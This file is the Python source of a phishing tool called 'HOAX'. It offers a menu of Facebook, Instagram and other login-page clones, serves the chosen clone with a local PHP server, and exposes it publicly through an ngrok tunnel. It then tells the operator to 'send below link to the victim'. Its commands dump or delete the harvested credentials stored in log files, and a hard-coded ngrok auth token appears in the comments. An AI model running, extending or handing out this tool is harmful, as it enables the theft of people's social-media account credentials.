import json
import http.server
import socketserver
import time
from pyngrok import ngrok, conf
import pyfiglet
import os
import credentials
import colorama
from colorama import Fore
from url_extractor import url_extract

colorama.init()

def get_key():   
    f = open("ngrok_api_log.txt", "r")
    lines = f.read().split("\n")
    return lines[0]

NGROK_KEY = get_key().strip()

# auth_key = "299FED0QV81gQREsrXHLmdey2S2_5saXiXSDzhSgxp6AcWPgf"
# ascii_banner = pyfiglet.figlet_format("HOAX!")
# print()
# print(ascii_banner)
# print(" "*10 + "Coded with <3, cj.")
# print(" "+"*"*16 + " HOAX " + "*"*16)

#help, manual for commands

def help(Command):
    match Command[0]:
        case "help":
            print(" ["+Fore.CYAN+"-h, help"+Fore.WHITE+"] for information about how commads work.\n [-v, version] show  the current version of tool.\n ["+Fore.CYAN+"-a, auth"+Fore.WHITE+"] author of the tool. \n ["+Fore.CYAN+"-n, name"+Fore.WHITE+"] tool name.")
            print(" ["+Fore.CYAN+"0"+Fore.WHITE+"] terminates the script")
            print(" ["+Fore.CYAN+"-dc, dump credentials"+Fore.WHITE+"] ["+Fore.CYAN+"sitename"+Fore.WHITE+"] shows the all credentials related to the sitename")
            print(" ["+Fore.CYAN+"-rc, remove credentials"+Fore.WHITE+"] ["+Fore.CYAN+"sitename"+Fore.WHITE+"] delete tha all credentials related to the sitename")
        case "-h":
            print(" ["+Fore.CYAN+"-h, help"+Fore.WHITE+"] for information about how commads work.\n [-v, version] show  the current version of tool.\n ["+Fore.CYAN+"-a, auth"+Fore.WHITE+"] author of the tool. \n ["+Fore.CYAN+"-n, name"+Fore.WHITE+"] tool name.")
            print(" ["+Fore.CYAN+"0"+Fore.WHITE+"] terminates the script")
            print(" ["+Fore.CYAN+"-dc, dump credentials"+Fore.WHITE+"] ["+Fore.CYAN+"sitename"+Fore.WHITE+"] shows the all credentials related to the sitename")
            print(" ["+Fore.CYAN+"-rc, remove credentials"+Fore.WHITE+"] ["+Fore.CYAN+"sitename"+Fore.WHITE+"] delete tha all credentials related to the sitename")
        case "version":
            f = open('package.json')
            data = json.load(f)
            print(" Version: " + data['version'])
            f.close()
        case "auth":
            f = open('package.json')
            data = json.load(f)
            print(" Author: " + data['author'])
            f.close()
        case "-v":
            f = open('package.json')
            data = json.load(f)
            print(" Version: " + data['version'])
            f.close()
        case "-a":
            f = open('package.json')
            data = json.load(f)
            print(" Author: " + data['author'])
            f.close()
        case "name":
            f = open('package.json')
            data = json.load(f)
            print(" Name: " + data['name'])
            f.close()
        case "-n":
            f = open('package.json')
            data = json.load(f)
            print(" Name: " + data['name'])
            f.close()
        case "-rc":

            match Command[1]:
                case "facebook":
                    try:
                        credentials.del_credential("sites/"+Command[1]+"/log.txt")
                        print(" ["+Fore.LIGHTGREEN_EX+"Ok"+Fore.WHITE+"] Deleted Successfuly!")
                    except:
                        print(" ["+Fore.RED+"Err"+Fore.WHITE+"] Command not found, \""+Command[1]+"\""+" is not valid cammand!")

                case "instagram":
                    try:
                        credentials.del_credential("sites/"+Command[1]+"/log.txt")
                    except:
                        print(" ["+Fore.RED+"Err"+Fore.WHITE+"] Command not found, \""+Command[1]+"\""+" is not valid cammand!")
                case defualt:
                    print(" ["+Fore.RED+"Err"+Fore.WHITE+"] Command not found, \""+Command[1]+"\""+" is not valid cammand!")

        case "-dc":
            match Command[1]:
                case "facebook":
                    try:
                        credentials.find_credentials("sites/"+Command[1]+"/log.txt")
                    except:
                        print(" ["+Fore.RED+"Err"+Fore.WHITE+"] Command not found, \""+Command[1]+"\""+" is not valid cammand!")

                case "instagram":
                    try:
                        credentials.find_credentials("sites/"+Command[1]+"/log.txt")
                    except:
                        print(" ["+Fore.RED+"Err"+Fore.WHITE+"] Command not found, \""+Command[1]+"\""+" is not valid cammand!")

                case defualt:
                    print(" ["+Fore.RED+"Err"+Fore.WHITE+"] Command not found, \""+Command[1]+"\""+" is not valid cammand!")


        # case "rm-cred":
        #     credentials.del_credential("sites/facebook/log.txt")
        # case "dump-cred":
        #     credentials.find_credentials("sites/facebook/log.txt")
        case defualt:
            print(" "+Fore.RED+"Err"+Fore.WHITE+" Command not found, \""+Command+"\""+" is not valid cammand!")

#menu items
def menu():
    print()
    print(" ["+Fore.YELLOW+"!"+Fore.WHITE+"] Choose the option..!")
    print(" ["+Fore.CYAN+"1"+Fore.WHITE+"] Facebook\t\t["+Fore.CYAN+"2"+Fore.WHITE+"] Instagram")
    print(" ["+Fore.CYAN+"3"+Fore.WHITE+"] Google\t\t["+Fore.CYAN+"4"+Fore.WHITE+"] Twitter")
    print(" ["+Fore.CYAN+"5"+Fore.WHITE+"] Linked In\t\t["+Fore.CYAN+"6"+Fore.WHITE+"] Snapchat")
    print(" ["+Fore.CYAN+"7"+Fore.WHITE+"] YouTube\t\t["+Fore.CYAN+"0"+Fore.WHITE+"] exit")

#options
def options(USER_INPUT):
    USER_INPUT = USER_INPUT.strip()
    USER_INPUT = USER_INPUT.lower()
    
    #list of arguments passes
    arguments = USER_INPUT.split(" ")
    
    #USER_INPUT => arguments[]
    if arguments[0].isdigit():
        match arguments[0]:
            case "1":
                print(" ["+Fore.CYAN+"*"+Fore.WHITE+"] connecting to the Facebook...")
                time.sleep(3)
                server_run("sites/facebook", 8000)
            case "2":
                print(" ["+Fore.CYAN+"*"+Fore.WHITE+"] connecting to the Instagram...")
                time.sleep(3)
                server_run("sites/instagram", 8001)
            case "3":
                print(" ["+Fore.CYAN+"*"+Fore.WHITE+"] connecting to the Google...")
                time.sleep(3)
            case "4":
                print(" ["+Fore.CYAN+"*"+Fore.WHITE+"] connecting to the Twitter...")
                time.sleep(3)
            case "5":
                print(" ["+Fore.CYAN+"*"+Fore.WHITE+"] connecting to the Linked In...")
                time.sleep(3)
            case "6":
                print(" ["+Fore.CYAN+"*"+Fore.WHITE+"] connecting to the Snapchat...") 
                time.sleep(3)
            case "7":
                print(" ["+Fore.CYAN+"*"+Fore.WHITE+"] connecting to the YouTube...")
            case "0":
                exit()
                # run.main_home()
            case defualt:
                print(" ["+Fore.RED+"Err"+Fore.WHITE+"] Command not found, \""+USER_INPUT+"\""+" is not valid cammand!")
    else:
        if USER_INPUT != "":
            try:
                help(arguments)
            except:
                print(" ["+Fore.RED+"Err"+Fore.WHITE+"] Command not found, \""+USER_INPUT+"\""+" is not valid cammand!")

        elif USER_INPUT == "":
            return 0
        else:
            print(" ["+Fore.RED+"Err"+Fore.WHITE+"] Command not found, \""+USER_INPUT+"\""+" is not valid cammand!")

#server connectin 120.0.0.1 on port 8000
def server_run(str_path, prt):
    PORT = prt
    comd = "php -S localhost:" + str(prt) + " -t " + str_path
    print(" ["+Fore.CYAN+"*"+Fore.WHITE+"] server running on port: " + str(PORT))
    time.sleep(3)
    # print(" [+] Link:> http://127.0.0.1:" + str(PORT))
    # time.sleep(3)
    print(" ["+Fore.CYAN+"*"+Fore.WHITE+"] Link:> http://localhost:" + str(PORT))
    time.sleep(3)
    # Star the server
    try:
        print(" ["+Fore.YELLOW+"!"+Fore.WHITE+"] Send below link to the victim. ")
        # conf.get_default().auth_token = "299FED0QV81gQREsrXHLmdey2S2_5saXiXSDzhSgxp6AcWPgf"
        conf.get_default().auth_token = NGROK_KEY
        url = ngrok.connect(PORT, "http")
        print(" ["+Fore.LIGHTGREEN_EX+"Ok"+Fore.WHITE+"] "+ str(url_extract(url)))
        time.sleep(3)
        os.system(comd)
    except:
        print(" ["+Fore.RED+"Err"+Fore.WHITE+"] Server is not responding!")


#parent function 
def main():
    while True:
        print()
        user_input = input("HOAX/phishing>> ")
        options(user_input)
        main()

#function call section
# menu()
# main()
